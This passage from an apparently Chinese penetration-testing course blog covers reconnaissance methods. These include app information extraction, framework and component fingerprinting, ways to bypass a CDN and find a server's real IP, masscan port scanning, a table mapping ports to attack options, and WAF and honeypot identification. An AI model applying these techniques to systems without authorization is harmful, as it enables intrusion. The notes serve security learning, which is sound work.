title="案例3：某APP打开无数据包，登录有数据包"></a>案例3：某APP打开无数据包，登录有数据包</h2><p>（反编译后未找到目标资产，抓包住到了）<br>原因：那个登录界面（点击登录，有交互）是APP打包的资源，并没有对外发送数据  </p><h2 id="案例4：APP提取信息-静态分析"><a href="#案例4：APP提取信息-静态分析" class="headerlink" title="案例4：APP提取信息-静态分析"></a>案例4：APP提取信息-静态分析</h2><p>1、MobSF<br>2、AppInfoScanner<br>3、两个在线平台<br><a href="https://mogua.co/">https://mogua.co/</a><br><a href="https://www.zhihuaspace.cn:8888/%EF%BC%88%E7%94%A8%E9%9D%99%E6%80%81%E5%8A%9F%E8%83%BD%EF%BC%89">https://www.zhihuaspace.cn:8888/（用静态功能）</a><br><a href="https://github.com/kelvinBen/AppInfoScanner%EF%BC%88%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%EF%BC%89">https://github.com/kelvinBen/AppInfoScanner（静态分析工具）</a><br><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a><br>4、Windows - MobSF安装参考：<br><a href="https://www.cnblogs.com/B-hai/p/15696948.html">https://www.cnblogs.com/B-hai/p/15696948.html</a><br><a href="https://blog.csdn.net/ljh824144294/article/details/119181803">https://blog.csdn.net/ljh824144294/article/details/119181803</a>  </p><h2 id="案例5：APP提取信息-动态抓包"><a href="#案例5：APP提取信息-动态抓包" class="headerlink" title="案例5：APP提取信息-动态抓包"></a>案例5：APP提取信息-动态抓包</h2><p>-前期部分抓包技术  </p><h2 id="案例6：APP提取信息-动态调试"><a href="#案例6：APP提取信息-动态调试" class="headerlink" title="案例6：APP提取信息-动态调试"></a>案例6：APP提取信息-动态调试</h2><p>-<strong>MobSF+模拟器（重难点）</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17信息打点-框架组件识别</title>
      <link href="/2023/10/03/17%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6%E8%AF%86%E5%88%AB/"/>
      <url>/2023/10/03/17%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E6%A1%86%E6%9E%B6%E7%BB%84%E4%BB%B6%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>19、CMS指纹识别-不出网程序识别  </li><li>20、开发框架识别-PHP&amp;Python&amp;Java  </li><li>21、开发组件识别-Java常见安全漏洞组件<br>解决：<br>1、CMS识别到后期漏洞利用和代码审计<br>2、开发框架识别到后期漏洞利用和代码审计<br>3、开发组件识别到后期漏洞利用和代码审计</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><h3 id="后端："><a href="#后端：" class="headerlink" title="后端："></a>后端：</h3><p>CMS：一般PHP开发居多源码程序<br>（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计）  </p><h3 id="前端："><a href="#前端：" class="headerlink" title="前端："></a>前端：</h3><p>js 框架（爬取更多的js从里面筛选URL或敏感泄漏key等）<br>也是可以通过对js代码逻辑进行代码审计  </p><h3 id="组件："><a href="#组件：" class="headerlink" title="组件："></a>组件：</h3><p>java居多，常见有过安全漏洞组件（shiro solr log4j sprintboot等）  </p><h3 id="框架："><a href="#框架：" class="headerlink" title="框架："></a>框架：</h3><p>php java python都有<br>简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可<br>如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可  </p><h3 id="影响："><a href="#影响：" class="headerlink" title="影响："></a>影响：</h3><p>如果采用框架开发，代码的安全性是取决于框架的过滤机制</p><h3 id="组件：-1"><a href="#组件：-1" class="headerlink" title="组件："></a>组件：</h3><p>第三方的功能模块（日志记录，数据监控，数据转换等）</p><h3 id="Web架构："><a href="#Web架构：" class="headerlink" title="Web架构："></a>Web架构：</h3><ul><li>1、最简单最入门的开发模型（功能代码全部手写）<br>最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写</li><li>2、结合开发框架的开发模型（以框架为核心实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li><li>3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）</li></ul><h3 id="指纹识别-本地工具-GotoScan（CMSEEK）"><a href="#指纹识别-本地工具-GotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-GotoScan（CMSEEK）"></a>指纹识别-本地工具-GotoScan（CMSEEK）</h3><ul><li>1、在线平台见前面课程，本地工具适用于不出网环境<br><a href="https://github.com/newbe3three/gotoscan">https://github.com/newbe3three/gotoscan</a>  </li><li>2、网络空间：Fofa Quake Hunter  </li><li>3、网络空间：IO图标关系</li></ul><h2 id="Python-开发框架-Django-Flask"><a href="#Python-开发框架-Django-Flask" class="headerlink" title="Python-开发框架-Django&amp;Flask"></a>Python-开发框架-Django&amp;Flask</h2><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><ul><li>1、识别插件(wappalyzer)  </li><li>2、Set-Cookie:expires&#x3D;<br>(数据包<strong>csrftoken</strong>)</li></ul><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><ul><li>1、识别插件  </li><li>2、Set-Cookie:expires&#x3D;<br>(数据包<strong>flask</strong>)</li></ul><h2 id="PHP-开发框架-ThinkPHP-Laravel-Yii"><a href="#PHP-开发框架-ThinkPHP-Laravel-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><h3 id="ThinkPHP："><a href="#ThinkPHP：" class="headerlink" title="ThinkPHP："></a>ThinkPHP：</h3><ul><li>1、识别插件  </li><li>2、X-Powered-By: <strong>ThinkPHP</strong>  </li><li>3、CMS识别到源码体系TP开发</li></ul><h3 id="Laravel："><a href="#Laravel：" class="headerlink" title="Laravel："></a>Laravel：</h3><ul><li>1、识别插件  </li><li>2、Set-Cookie中特征的格式<br>(识别方式：<strong>XSRF-token</strong>&#x2F;<strong>laravel-session</strong>)</li></ul><h3 id="Yii"><a href="#Yii" class="headerlink" title="Yii:"></a>Yii:</h3><ul><li>1、识别插件  </li><li>2、Set-Cookie中特征的格式</li></ul><h2 id="Java-框架组件-Fastjson-Shiro-Solr-Spring"><a href="#Java-框架组件-Fastjson-Shiro-Solr-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p><a href="https://blog.csdn.net/agonie201218/article/details/125300729">52类110个主流Java组件和框架介绍</a>  </p><h3 id="Fastjson-Jackson"><a href="#Fastjson-Jackson" class="headerlink" title="Fastjson&#x2F;Jackson"></a>Fastjson&#x2F;Jackson</h3><p>在提交JSON数据包中修改测试：<br>-Fastjson组件会把01解析成1<br>-Jackson组件在解析01时会抛出异常<br><a href="https://forum.butian.net/share/1679">https://forum.butian.net/share/1679</a><br><a href="https://www.iculture.cc/forum-post/24115.html">https://www.iculture.cc/forum-post/24115.html</a>  </p><h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p>请求包的cookie中存在rememberMe字段<br>返回包中存在set-Cookie：<strong>remeberMe&#x3D;deleteMe</strong><br>请求包中存在rememberMe&#x3D;x时，响应包中存在rememberMe&#x3D;deleteMe<br>&nbsp;&nbsp;&nbsp;&nbsp;有时候服务器不会主动返回remeberMe&#x3D;deleteMe，直接发包即可，将Cookie内容改为remember Me&#x3D;1，若相应包有rememberMe&#x3D;deleteMe，则基本可以确定网站apache shiro搭建的  </p><h3 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h3><p>一般使用struts2框架后缀带do或action，可以尝试进行利用  </p><h3 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h3><p>1、通过web应用程序网页标签的小绿叶图标<br>2、通过springboot框架默认报错页面  </p><h3 id="Solr识别"><a href="#Solr识别" class="headerlink" title="Solr识别"></a>Solr识别</h3><p>一般开放8983端口,访问页面也可以探针到  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16基础入门-CDN绕过</title>
      <link href="/2023/10/03/16%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87/"/>
      <url>/2023/10/03/16%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>15、CDN服务-解释差异识别  </li><li>16、CDN绕过-配置差异导致  </li><li>17、CDN绕过-主动连接获取  </li><li>18、CDN绕过-全网扫描获取<br>解决：<br>1、CDN服务对安全影响<br>2、CDN服务绕过识别手法</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p><a href="https://www.wangan.com/p/7fy7f6d0b4d1aeaf#%E6%96%B9%E6%B3%95%E5%85%AD%EF%BC%9A%E5%88%A9%E7%94%A8%E7%BD%91%E7%AB%99%E8%BF%94%E5%9B%9E%E7%9A%84%E5%86%85%E5%AE%B9%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9E%E7%9A%84%E5%8E%9FIP">CDN绕过技术总汇</a>  </p><ul><li><p>1.传统访问：<br>用户访问域名–&gt;解析服务器IP–&gt;访问目标主机  </p></li><li><p>2.普通CDN：<br>用户访问域名–&gt;CDN节点–&gt;真实服务器IP–&gt;访问目标主机  </p></li><li><p>3.带WAF的CDN：<br>用户访问域名–&gt;CDN节点（WAF）–&gt;真实服务器IP–&gt;访问目标主机  </p></li><li><p>4.国内服务商：<br>阿里云  百度云  七牛云<br>又拍云 腾讯云  Ucloud<br>360  网宿科技 ChinaCache  </p></li><li><p>5.国外服务商：<br>CloudFlare StackPath Fastly<br>Akamai CloudFront Edgecast<br>CDNetworks Google Cloud CDN<br>CacheFly Keycdn Udomain CDN77</p></li></ul><h2 id="CDN配置：（CND也可以防止DDOS）"><a href="#CDN配置：（CND也可以防止DDOS）" class="headerlink" title="CDN配置：（CND也可以防止DDOS）"></a>CDN配置：（CND也可以防止DDOS）</h2><ul><li>配置1：加速域名-需要启用加速的域名</li><li>配置2：加速区域-需要启用加速的地区</li><li>配置3：加速类型-需要启用加速的资源</li></ul><h2 id="参考知识："><a href="#参考知识：" class="headerlink" title="参考知识："></a>参考知识：</h2><p><a href="https://mp.weixin.qq.com/s/zxEH-HMqKukmq7qXfrdnQQ">渗透测试中最全的CDN绕过总结</a><br>超级Ping：<a href="http://www.17ce.com/">http://www.17ce.com/</a><br>超级Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>接口查询：<a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>国外请求：<a href="https://boce.aliyun.com/detect/">https://boce.aliyun.com/detect/</a><br>IP社区库：<a href="https://www.cz88.net/geo-public">https://www.cz88.net/geo-public</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a><br>全网扫描：<a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a><br>全网扫描：<a href="https://github.com/Pluto-123/Bypass_cdn">https://github.com/Pluto-123/Bypass_cdn</a>  </p><p>常见方法：<br>子域名，邮件系统，国外访问，证书查询，APP抓包，网络空间<br>通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等  </p><h2 id="前置后置-CDN服务-识别-绑定访问"><a href="#前置后置-CDN服务-识别-绑定访问" class="headerlink" title="前置后置-CDN服务-识别&amp;绑定访问"></a>前置后置-CDN服务-识别&amp;绑定访问</h2><p>超级Ping：<a href="http://17ce.com/">http://17ce.com/</a><br>超级Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a><br>各地ping（出现多个IP即启用CDN服务）<br>后置：绑定HOST访问解析（参考基础课CDN安全影响）  </p><h2 id="某应用-CDN绕过-主动漏洞-遗留文件"><a href="#某应用-CDN绕过-主动漏洞-遗留文件" class="headerlink" title="某应用-CDN绕过-主动漏洞&amp;遗留文件"></a>某应用-CDN绕过-主动漏洞&amp;遗留文件</h2><p>配置加速选项中只加速主域名，导致其他子域名未加速（解析IP可能同IP也可能C段）<br>接口查询：<a href="https://get-site-ip.com/%EF%BC%88%E6%9F%A5%E8%AF%A2%E7%9C%9F%E5%AE%9EIP%EF%BC%89">https://get-site-ip.com/（查询真实IP）</a><br>接口查询：<a href="https://fofa.info/extensions/source">https://fofa.info/extensions/source</a><br>使用网络空间&amp;第三方功能集合查询判断  </p><h2 id="某应用-CDN绕过-主动漏洞-遗留文件-1"><a href="#某应用-CDN绕过-主动漏洞-遗留文件-1" class="headerlink" title="某应用-CDN绕过-主动漏洞&amp;遗留文件"></a>某应用-CDN绕过-主动漏洞&amp;遗留文件</h2><ul><li>1、漏洞如：SSRF RCE等<br>利用漏洞让对方真实服务器主动出网连接，判断来源IP即真实IP  </li><li>2、遗留文件：phpinfo类似功能<br>通过访问类似PHPINFO类似代码函数获取本地IP造成的地址泄漏</li></ul><h2 id="某应用-CDN绕过-邮件系统"><a href="#某应用-CDN绕过-邮件系统" class="headerlink" title="某应用-CDN绕过-邮件系统"></a>某应用-CDN绕过-邮件系统</h2><p>判断条件：发信人是当前域名邮件用户名  </p><h3 id="让他主动给你发："><a href="#让他主动给你发：" class="headerlink" title="让他主动给你发："></a>让他主动给你发：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;部署架设的邮件服务器如果向外部用户发送邮件的话，那么邮件头部的源码中会包含此邮件服务器的真实IP地址。<br>常见的邮件触发点有：  </p><ul><li>1、RSS订阅  </li><li>2、邮箱注册、激活处  </li><li>3、邮箱找回密码处  </li><li>4、产品更新的邮件推送  </li><li>5、某业务执行后发送的邮件通知  </li><li>6、员工邮箱、邮件管理平台等入口处的忘记密码</li></ul><h3 id="你给未知邮箱发：（需要自己的邮件服务器不能第三方）"><a href="#你给未知邮箱发：（需要自己的邮件服务器不能第三方）" class="headerlink" title="你给未知邮箱发：（需要自己的邮件服务器不能第三方）"></a>你给未知邮箱发：（需要自己的邮件服务器不能第三方）</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过发送邮件给一个不存在的邮箱地址，因为该用户邮箱不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实IP通知。  </p><h2 id="某应用-CDN绕过-全网扫描（最后的办法）"><a href="#某应用-CDN绕过-全网扫描（最后的办法）" class="headerlink" title="某应用-CDN绕过-全网扫描（最后的办法）"></a>某应用-CDN绕过-全网扫描（最后的办法）</h2><p>1、判断加速厂商<br>2、IP库筛地址段<br>3、配置范围扫描<br>先从IP段去扫描符合开放端口，再从IP去访问看看关键字，将符合结果进行保存！<br>厂商查询：<br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>工具项目：<br><a href="https://www.cz88.net/geo-public">https://www.cz88.net/geo-public</a><br><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15信息打点-主机架构</title>
      <link href="/2023/10/03/15%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%B8%BB%E6%9C%BA%E6%9E%B6%E6%9E%84/"/>
      <url>/2023/10/03/15%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%B8%BB%E6%9C%BA%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>12、端口扫描-应用&amp;协议  </li><li>13、WAF识别-分类&amp;识别  </li><li>14、蜜罐识别-分类&amp;识别<br>解决：<br>1、Web服务器&amp;应用服务器差异性<br>2、WAF防火墙&amp;安全防护&amp;识别技术<br>3、蜜罐平台&amp;安全防护&amp;识别技术</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造,vrfy&#x2F;expn查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td></tr><tr><td>tcp&#x2F;udp 53</td><td>DNS</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td></tr><tr><td>tcp&#x2F;udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的Web服务端口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java控制台,各类服务器Web管理面板,各类Web中间件漏洞利用,各类Web框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>ldap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Oracle</td><td>tns爆破,注入,弹shell…</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破,想办法钓VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase&#x2F;DB2</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5902</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat Ajp</td><td>Tomcat-Ajp协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere</td><td>Java反序列化&#x2F;弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><p> <img src="/2023/10/03/15%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%B8%BB%E6%9C%BA%E6%9E%B6%E6%9E%84/%E8%9C%9C%E7%BD%901.png"><br> <img src="/2023/10/03/15%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%B8%BB%E6%9C%BA%E6%9E%B6%E6%9E%84/%E8%9C%9C%E7%BD%902.png"></p><h2 id="识别-Web服务器-请求返回包"><a href="#识别-Web服务器-请求返回包" class="headerlink" title="识别-Web服务器-请求返回包"></a>识别-Web服务器-请求返回包</h2><h2 id="识别-应用服务器-端口扫描技术"><a href="#识别-应用服务器-端口扫描技术" class="headerlink" title="识别-应用服务器-端口扫描技术"></a>识别-应用服务器-端口扫描技术</h2><h2 id="识别-其他服务协议-端口扫描技术"><a href="#识别-其他服务协议-端口扫描技术" class="headerlink" title="识别-其他服务协议-端口扫描技术"></a>识别-其他服务协议-端口扫描技术</h2><p>-Web中间件探针<br>-应用中间件探针<br>-数据库类型探针<br>-其他服务协议探针<br>端口扫描：Nmap、Masscan、网络空间<br>开放状态：Close Open Filtered<br><a href="https://nmap.org/download.html">https://nmap.org/download.html</a><br><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>使用参考：<br><a href="https://blog.csdn.net/qq_53079406/article/details/125266331">https://blog.csdn.net/qq_53079406/article/details/125266331</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125263917">https://blog.csdn.net/qq_53079406/article/details/125263917</a><br>编译masscan：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    masscan.exe -p端口 ipadddress</span><br><span class="line">例：masscan.exe -p1-65535 192.168.43.176 --rate=10000</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/lzy575566/p/15513726.html">https://www.cnblogs.com/lzy575566/p/15513726.html</a><br>考虑：1、防火墙 2、内网环境<br>内网环境可能出现情况：明明数据库端口开的，网站也能正常打开，但是你对目标进行端口扫描，发现数据库端口没有开放（排除防火墙问题）  </p><h2 id="识别-WAF防火墙-看图-项目-指纹"><a href="#识别-WAF防火墙-看图-项目-指纹" class="headerlink" title="识别-WAF防火墙-看图&amp;项目&amp;指纹"></a>识别-WAF防火墙-看图&amp;项目&amp;指纹</h2><h3 id="1、WAF解释："><a href="#1、WAF解释：" class="headerlink" title="1、WAF解释："></a>1、WAF解释：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><h3 id="2、WAF分类："><a href="#2、WAF分类：" class="headerlink" title="2、WAF分类："></a>2、WAF分类：</h3><ul><li>云WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等  </li><li>硬件WAF：绿盟、安恒、深信服、知道创宇等公司商业产品  </li><li>软件WAF：宝塔，安全狗、D盾等  </li><li>代码级WAF：自己写的waf规则，防止出现注入等，一般是在代码里面写死的</li></ul><h3 id="3、识别看图："><a href="#3、识别看图：" class="headerlink" title="3、识别看图："></a>3、识别看图：</h3><p>拦截页面，identywaf项目内置  </p><h3 id="4、识别项目："><a href="#4、识别项目：" class="headerlink" title="4、识别项目："></a>4、识别项目：</h3><ul><li><p>*wafw00f<br><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </p></li><li><p>*identywaf<br><a href="https://github.com/stamparm/identYwaf">https://github.com/stamparm/identYwaf</a></p></li></ul><h2 id="识别-蜜罐平台-人工-网络空间-项目"><a href="#识别-蜜罐平台-人工-网络空间-项目" class="headerlink" title="识别-蜜罐平台-人工&amp;网络空间&amp;项目"></a>识别-蜜罐平台-人工&amp;网络空间&amp;项目</h2><h3 id="蜜罐解释："><a href="#蜜罐解释：" class="headerlink" title="蜜罐解释："></a>蜜罐解释：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法。  </p><h3 id="蜜罐分类："><a href="#蜜罐分类：" class="headerlink" title="蜜罐分类："></a>蜜罐分类：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如：数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等。  </p><h3 id="蜜罐产品："><a href="#蜜罐产品：" 